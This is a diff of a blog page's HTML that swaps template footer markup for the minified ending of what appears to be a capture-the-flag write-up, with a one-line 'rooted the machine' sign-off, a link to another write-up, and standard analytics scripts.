-          </div>
-        </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
-      </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      <div class="copyright copyright--user">Lanfran02</div>
-      
-  </div>
-</footer>
-
-<script src="/assets/main.js"></script>
-<script src="/assets/prism.js"></script>
-
-
-      
-    </div>
-
-    
-  </body>
-</html>
+</code></pre></div><p>And we rooted the machine!</p><p>That&rsquo;s all from my side, hope you find this helpful!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/posts/brooklynninenine/><span class=button__icon>←</span>
+<span class=button__text>Brooklyn Nine Nine - Write Up</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user">Lanfran02</div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script></body></html>
